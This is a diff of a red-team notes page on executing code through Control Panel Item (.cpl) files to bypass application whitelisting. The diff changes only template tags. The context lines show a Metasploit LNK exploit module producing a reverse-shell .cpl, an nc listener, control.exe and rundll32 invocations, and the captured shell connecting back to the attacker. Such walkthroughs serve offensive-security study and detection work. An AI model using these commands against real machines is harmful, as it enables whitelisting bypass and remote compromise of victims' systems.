@@ -8,8 +8,8 @@ description: Control Panel Item code execution - bypass application whitelisting
 
 Generating a simple x64 reverse shell in a .cpl format:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 msfconsole
 use windows/local/cve_2017_8464_lnk_lpe
@@ -20,8 +20,8 @@ exploit
 root@~# nc -lvp 4444
 listening on [any] 4444 ...
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 We can see that the .cpl is simply a DLL with DllMain function exported:
 
@@ -33,8 +33,8 @@ A quick look at the dissasembly of the dll suggests that rundll32.exe will be sp
 
 Invoking the shellcode via control.exe:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 control.exe .\FlashPlayerCPLApp.cpl
 # or
@@ -42,21 +42,21 @@ rundll32.exe shell32.dll,Control_RunDLL file.cpl
 # or
 rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Attacking machine receiving the reverse shell:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 10.0.0.2: inverse host lookup failed: Unknown host
 connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 49346
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Observations
 
